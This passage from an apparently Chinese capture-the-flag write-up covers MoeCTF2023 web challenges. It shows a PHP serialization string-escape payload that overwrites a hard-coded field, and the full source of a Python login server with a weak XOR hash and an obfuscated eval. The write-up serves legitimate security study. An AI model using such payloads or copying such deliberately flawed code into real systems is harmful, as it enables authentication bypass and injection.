<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>思路很明显，让<code>$Spear_Owner</code>的值为MaoLei即可获得flag，这里<code>$Spear_Owner</code>的值在Omg_It_Is_So_Cool_Bring_Me_My_Flag类里被写死了</p>
<p>但是在<code>Deadly_Thirteen_Spears::Make_a_Move</code>方法中存在<code>str_replace</code>方法，也就是说我们可以利用字符串逃逸的方式让<code>$Spear_Owner</code>的值为MaoLei</p>
<p>那么我们的目的就是构造逃逸字符串在后面插入<code>&quot;;s:11:&quot;Spear_Owner&quot;;s:6:&quot;MaoLei&quot;;&#125;</code>进行闭合，这里长度为35</p>
<p>在上面的<code>$Top_Secret_Long_Spear_Techniques_Manual</code>数组中寻找合适的字符串进行替换，可以找到<code>&quot;&quot; =&gt; &quot;Penetrating_Gaze&quot;</code>，长度从11变成16，每次增加5个长度，那么重复7次即可逃逸 </p>
<p>payload：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>chant<span class="token operator">=</span>di_qi_qiangdi_qi_qiangdi_qi_qiangdi_qi_qiangdi_qi_qiangdi_qi_qiangdi_qi_qiang<span class="token string double-quoted-string">";s:11:"</span>Spear_Owner<span class="token string double-quoted-string">";s:6:"</span>MaoLei"<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2023/08/15/MoeCTF2023/image-20231012105008077.png" alt="image-20231012105008077"></p>
<hr>
<h2 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h2><blockquote>
<p>python代码审计</p>
</blockquote>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> secrets <span class="token keyword">import</span> users<span class="token punctuation">,</span> salt
<span class="token keyword">import</span> hashlib
<span class="token keyword">import</span> base64
<span class="token keyword">import</span> json
<span class="token keyword">import</span> http<span class="token punctuation">.</span>server

<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"flag.txt"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
    FLAG <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">gethash</span><span class="token punctuation">(</span><span class="token operator">*</span>items<span class="token punctuation">)</span><span class="token punctuation">:</span>
    c <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token keyword">for</span> item <span class="token keyword">in</span> items<span class="token punctuation">:</span>
        <span class="token keyword">if</span> item <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
            <span class="token keyword">continue</span>
        c <span class="token operator">^</span><span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>salt<span class="token punctuation">&#125;</span></span><span class="token string">[</span><span class="token interpolation"><span class="token punctuation">&#123;</span>item<span class="token punctuation">&#125;</span></span><span class="token string">]</span><span class="token interpolation"><span class="token punctuation">&#123;</span>salt<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"big"</span><span class="token punctuation">)</span> <span class="token comment"># it looks so complex! but is it safe enough?</span>
    <span class="token keyword">return</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>

<span class="token keyword">assert</span> <span class="token string">"admin"</span> <span class="token keyword">in</span> users
<span class="token keyword">assert</span> users<span class="token punctuation">[</span><span class="token string">"admin"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"admin"</span>

hashed_users <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span>gethash<span class="token punctuation">(</span>k<span class="token punctuation">,</span>v<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> k<span class="token punctuation">,</span>v <span class="token keyword">in</span> users<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">0x636d616f686e69656e61697563206e6965756e63696165756e6320696175636e206975616e6363616361766573206164</span><span class="token operator">^</span><span class="token number">8651845801355794822748761274382990563137388564728777614331389574821794036657729487047095090696384065814967726980153</span><span class="token punctuation">,</span><span class="token number">160</span><span class="token punctuation">,</span><span class="token string">"big"</span><span class="token punctuation">,</span>signed<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>translate<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token boolean">None</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token string">"\x00"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># what is it?</span>
    
<span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>data<span class="token punctuation">:</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            data <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># ummm...? It looks like it's just base64 encoding it 5 times? truely?</span>
        <span class="token keyword">return</span> data

__page__ <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span><span class="token string">"PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KICAgIDx0aXRsZT5zaWduaW48L3RpdGxlPgogICAgPHNjcmlwdD4KICAgICAgICBbXVsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXV1bKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVsrW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW10re30pWyshIVtdXSsoISFbXStbXSlbKyEhW11dXSgoK3t9K1tdKVsrISFbXV0rKCEhW10rW10pWytbXV0rKFtdK3t9KVsrISFbXV0rKFtdK3t9KVshK1tdKyEhW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rW11bKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyghIVtdK1tdKVsrISFbXV0rKCEhW10rW10pWytbXV1dWyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoW10re30pWyshIVtdXSsoW11bW11dK1tdKVsrISFbXV0rKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyghIVtdK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbK1tdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXV0oKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdW1tdXStbXSlbK1tdXSsoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXVtbXV0rW10pWytbXV0rKFtdW1tdXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKygre30rW10pWyshIVtdXSsoW10rW11bKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyghIVtdK1tdKVsrISFbXV0rKCEhW10rW10pWytbXV1dWyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoW10re30pWyshIVtdXSsoW11bW11dK1tdKVsrISFbXV0rKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyghIVtdK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbK1tdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXV0oKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdW1tdXStbXSlbK1tdXSsoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW11dKyghW10rW10pWyErW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKygre30rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSkoIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10pKVshK1tdKyEhW10rISFbXV0rKFtdW1tdXStbXSlbIStbXSshIVtdKyEhW11dKSghK1tdKyEhW10rISFbXSshIVtdKShbXVsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXV1bKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVsrW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW10re30pWyshIVtdXSsoISFbXStbXSlbKyEhW11dXSgoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW11bW11dK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbKyEhW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rKFtdW1tdXStbXSlbIStbXSshIVtdKyEhW11dKyghW10rW10pWyErW10rISFbXSshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCt7fStbXSlbKyEhW11dKyhbXStbXVsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXV1bKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVsrW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW10re30pWyshIVtdXSsoISFbXStbXSlbKyEhW11dXSgoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW11bW11dK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbKyEhW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rKCFbXStbXSlbIStbXSshIVtdXSsoW10re30pWyshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCt7fStbXSlbKyEhW11dKyghIVtdK1tdKVsrW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKFtdW1tdXStbXSlbKyEhW11dKSghK1tdKyEhW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXSkpWyErW10rISFbXSshIVtdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXV0pKCErW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10pKChbXSt7fSlbK1tdXSlbK1tdXSsoIStbXSshIVtdKyEhW10rW10pKyhbXVtbXV0rW10pWyErW10rISFbXV0pKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rKFtdK3t9KVshK1tdKyEhW11dKyghIVtdK1tdKVsrW11dKyhbXSt7fSlbKyEhW11dKygre30rW10pWyshIVtdXSkoIStbXSshIVtdKyEhW10rISFbXSkKICAgICAgICB2YXIgXzB4ZGI1ND1bJ3N0cmluZ2lmeScsJ2xvZycsJ3Bhc3N3b3JkJywnL2xvZ2luJywnUE9TVCcsJ2dldEVsZW1lbnRCeUlkJywndGhlbiddO3ZhciBfMHg0ZTVhPWZ1bmN0aW9uKF8weGRiNTRmYSxfMHg0ZTVhOTQpe18weGRiNTRmYT1fMHhkYjU0ZmEtMHgwO3ZhciBfMHg0ZDhhNDQ9XzB4ZGI1NFtfMHhkYjU0ZmFdO3JldHVybiBfMHg0ZDhhNDQ7fTt3aW5kb3dbJ2FwaV9iYXNlJ109Jyc7ZnVuY3Rpb24gbG9naW4oKXtjb25zb2xlW18weDRlNWEoJzB4MScpXSgnbG9naW4nKTt2YXIgXzB4NWYyYmViPWRvY3VtZW50W18weDRlNWEoJzB4NScpXSgndXNlcm5hbWUnKVsndmFsdWUnXTt2YXIgXzB4NGZkMjI2PWRvY3VtZW50W18weDRlNWEoJzB4NScpXShfMHg0ZTVhKCcweDInKSlbJ3ZhbHVlJ107dmFyIF8weDFjNjFkOT1KU09OW18weDRlNWEoJzB4MCcpXSh7J3VzZXJuYW1lJzpfMHg1ZjJiZWIsJ3Bhc3N3b3JkJzpfMHg0ZmQyMjZ9KTt2YXIgXzB4MTBiOThlPXsncGFyYW1zJzphdG9iKGF0b2IoYXRvYihhdG9iKGF0b2IoXzB4MWM2MWQ5KSkpKSl9O2ZldGNoKHdpbmRvd1snYXBpX2Jhc2UnXStfMHg0ZTVhKCcweDMnKSx7J21ldGhvZCc6XzB4NGU1YSgnMHg0JyksJ2JvZHknOkpTT05bXzB4NGU1YSgnMHgwJyldKF8weDEwYjk4ZSl9KVtfMHg0ZTVhKCcweDYnKV0oZnVuY3Rpb24oXzB4Mjk5ZDRkKXtjb25zb2xlW18weDRlNWEoJzB4MScpXShfMHgyOTlkNGQpO30pO30KICAgIDwvc2NyaXB0Pgo8L2hlYWQ+Cjxib2R5PgogICAgPGgxPmV6U2lnbmluPC9oMT4KICAgIDxwPlNpZ24gaW4gdG8geW91ciBhY2NvdW50PC9wPgogICAgPHA+ZGVmYXVsdCB1c2VybmFtZSBhbmQgcGFzc3dvcmQgaXMgYWRtaW4gYWRtaW48L3A+CiAgICA8cD5Hb29kIEx1Y2shPC9wPgoKICAgIDxwPgogICAgICAgIHVzZXJuYW1lIDxpbnB1dCBpZD0idXNlcm5hbWUiPgogICAgPC9wPgogICAgPHA+CiAgICAgICAgcGFzc3dvcmQgPGlucHV0IGlkPSJwYXNzd29yZCIgdHlwZT0icGFzc3dvcmQiPgogICAgPC9wPgogICAgPGJ1dHRvbiBpZCA9ICJsb2dpbiI+CiAgICAgICAgTG9naW4KICAgIDwvYnV0dG9uPgo8L2JvZHk+CjxzY3JpcHQ+CiAgICBjb25zb2xlLmxvZygiaGVsbG8/IikKICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJsb2dpbiIpLmFkZEV2ZW50TGlzdGVuZXIoImNsaWNrIiwgbG9naW4pOwo8L3NjcmlwdD4KPC9odG1sPg=="</span><span class="token punctuation">)</span>
        
<span class="token keyword">class</span> <span class="token class-name">MyHandler</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>server<span class="token punctuation">.</span>BaseHTTPRequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">do_GET</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> self<span class="token punctuation">.</span>path <span class="token operator">==</span> <span class="token string">"/"</span><span class="token punctuation">:</span>
                self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span>
                self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>
                self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span>__page__<span class="token punctuation">)</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span>
                self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>
                self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b"404 Not Found"</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
            self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span>
            self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>
            self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b"500 Internal Server Error"</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">do_POST</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> self<span class="token punctuation">.</span>path <span class="token operator">==</span> <span class="token string">"/login"</span><span class="token punctuation">:</span>
                body <span class="token operator">=</span> self<span class="token punctuation">.</span>rfile<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"Content-Length"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                payload <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>body<span class="token punctuation">)</span>
                params <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>decrypt<span class="token punctuation">(</span>payload<span class="token punctuation">[</span><span class="token string">"params"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span>params<span class="token punctuation">)</span>
                <span class="token keyword">if</span> params<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"admin"</span><span class="token punctuation">:</span>
                    self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">)</span>
                    self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>
                    self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b"YOU CANNOT LOGIN AS ADMIN!"</span><span class="token punctuation">)</span>
                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token punctuation">)</span>
                    <span class="token keyword">return</span>
                <span class="token keyword">if</span> params<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span> <span class="token operator">==</span> params<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                    self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">)</span>
                    self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>
                    self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b"YOU CANNOT LOGIN WITH SAME USERNAME AND PASSWORD!"</span><span class="token punctuation">)</span>
                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"same"</span><span class="token punctuation">)</span>
                    <span class="token keyword">return</span>
                hashed <span class="token operator">=</span> gethash<span class="token punctuation">(</span>params<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>params<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token keyword">for</span> k<span class="token punctuation">,</span>v <span class="token keyword">in</span> hashed_users<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                    <span class="token keyword">if</span> hashed <span class="token operator">==</span> v<span class="token punctuation">:</span>
                        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
                            <span class="token string">"user"</span><span class="token punctuation">:</span>k<span class="token punctuation">,</span>
                            <span class="token string">"hash"</span><span class="token punctuation">:</span>hashed<span class="token punctuation">,</span>
                            <span class="token string">"flag"</span><span class="token punctuation">:</span> FLAG <span class="token keyword">if</span> k <span class="token operator">==</span> <span class="token string">"admin"</span> <span class="token keyword">else</span> <span class="token string">"flag&#123;YOU_HAVE_TO_LOGIN_IN_AS_ADMIN_TO_GET_THE_FLAG&#125;"</span>
                        <span class="token punctuation">&#125;</span>
                        self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span>
                        self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>
                        self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"success"</span><span class="token punctuation">)</span>
                        <span class="token keyword">return</span>
                self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">)</span>
                self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>
                self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b"Invalid username or password"</span><span class="token punctuation">)</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span>
                self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>
                self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b"404 Not Found"</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
            self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span>
            self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>
            self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b"500 Internal Server Error"</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    server <span class="token operator">=</span> http<span class="token punctuation">.</span>server<span class="token punctuation">.</span>HTTPServer<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token number">9999</span><span class="token punctuation">)</span><span class="token punctuation">,</span> MyHandler<span class="token punctuation">)</span>
    server<span class="token punctuation">.</span>serve_forever<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>先审计一下代码，要想得到flag就要以admin登录，默认的用户名和密码都是admin，但是上面的if判断又要求我们的username不能为admin，同时username的值又不能等于password的值</p>
<p>我们直接看这段代码</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">hashed <span class="token operator">=</span> gethash<span class="token punctuation">(</span>params<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>params<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token keyword">for</span> k<span class="token punctuation">,</span>v <span class="token keyword">in</span> hashed_users<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                    <span class="token keyword">if</span> hashed <span class="token operator">==</span> v<span class="token punctuation">:</span>
                        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
                            <span class="token string">"user"</span><span class="token punctuation">:</span>k<span class="token punctuation">,</span>
                            <span class="token string">"hash"</span><span class="token punctuation">:</span>hashed<span class="token punctuation">,</span>
                            <span class="token string">"flag"</span><span class="token punctuation">:</span> FLAG <span class="token keyword">if</span> k <span class="token operator">==</span> <span class="token string">"admin"</span> <span class="token keyword">else</span> <span class="token string">"flag&#123;YOU_HAVE_TO_LOGIN_IN_AS_ADMIN_TO_GET_THE_FLAG&#125;"</span>
                        <span class="token punctuation">&#125;</span>
                        self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span>
                        self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>
                        self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"success"</span><span class="token punctuation">)</span>
                        <span class="token keyword">return</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这里判断是否是admin是经过了<code>gethash</code>方法处理的，跟踪到<code>gethash</code>方法</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">gethash</span><span class="token punctuation">(</span><span class="token operator">*</span>items<span class="token punctuation">)</span><span class="token punctuation">:</span>
    c <span class="token operator">=</span> <span class="token number">0</span>
